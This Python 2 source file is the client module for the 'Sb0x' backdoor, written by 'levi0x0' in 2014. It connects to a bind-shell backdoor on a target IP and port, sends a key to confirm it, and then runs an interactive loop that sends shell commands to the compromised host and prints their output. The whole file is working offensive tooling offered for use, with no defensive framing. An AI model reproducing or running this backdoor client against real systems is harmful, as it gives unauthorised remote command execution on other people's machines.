"""
backdoor_client.py - Priv* script Written by Levi Nachamni (Client for Sb0x Backdoor)

Author: Levi Nachamni (levi0x0)
Date: 20/05/2014
Version: 0.1
License: GPL 3

Description:
	Priv* script Written by Levi Nachmani (Client for Sb0x Backdoor)

"""

MODULE_NAME = "Sb0x Backdoor Client"
MODULE_AUTHOR = "Levi Nachamni (levi0x0)"
MODULE_LICENSE = "GPL 3"
MODULE_VERSION = "0.1"
MODULE_DESC = "Priv* script (Client for Sb0x Backdoor)"

from socket import *
import sys
from time import asctime
from time import sleep
from api.std import *

class sb0x_client(object):
	
	def client(self):
		#========================#
  	#Set Geting Information          
    	#========================#
		sb0x = False #to test sb0x server
		target = raw_input("Target IP:") #target to connect
		port = int(raw_input("PORT:")) #port for the target
		key = raw_input("Key:") #get key will not encrypted!
		
    	#========================#
  	#Starting Client
    	#========================#
		notify("[*]Started at: %s" % (asctime())) #print out the current time
		notify("[*]Trying to OPEN bind shell on the Target...")
		count = 0 #count the while loop
		#=========================#
  	#testing if target is online #
    	#=========================#
		while True:
			count += 1
			s = socket( AF_INET, SOCK_STREAM) #open TCP/IPv4 socket
			test_open = s.connect_ex((target, port))
			if test_open == 0:
				pass #pass is online
			else:
				sleep(.1) #delay from the connection
				continue
			#============================#
  	  #Send key recv data#
    	    #============================#
			if count == 1: #if 1st loop
			  notify("[*]Checking if this is sb0x Server...")
			  s.send(key) #send the key (like password) to the server
			  try:
			    s.settimeout(10) #wait 10 sec for answer
			    notify("[*]Please Wait...")
			    answer = s.recv(1024) #recv key (answer)
			  except timeout: #except socket.timeout ERROR
			      notify("[*]Sorry sb0x Server not bind on this PORT! (Timeout 10 sec)")
			      s.close() #close socket
			  if answer == key: #if the server send back same key
			      notify("[+]sb0x g0t connection %s>%s" % (s.getsockname(), s.getpeername())) #we have connection yaya (:
			      s.close()
			      sb0x = True #now it's sb0x server
			      continue
			  else: #except key error
			    error("Key ERROR...")
			    s.close()
			    
			elif sb0x: #if sb0x is true!
					#=====================#
  		      #sb0x client shell#
    	            #=====================#
					notify("To kill the server Run: 'killall -9 python2.7'\nor 'killall -9 python'")
					prompt = raw_input("$ ") #sb0x prompt Yes finnaly!!
					if not prompt:
						prompt = "cd"
					elif prompt == "quit" or prompt == "exit" or prompt == "q": #prompt quit
						s.close()
					  	notify("\nConnection closed")
						break #break out the loop
					else:
						try:
						  sleep(.1) #sleep for socket delay
						  s.send(prompt)  #send command
						  data = s.recv(1024)
						  print "%s" % (data) #rec answer
						  s.close()
						except:
							pass

def main():
	bsc= sb0x_client()
	bsc.client() 
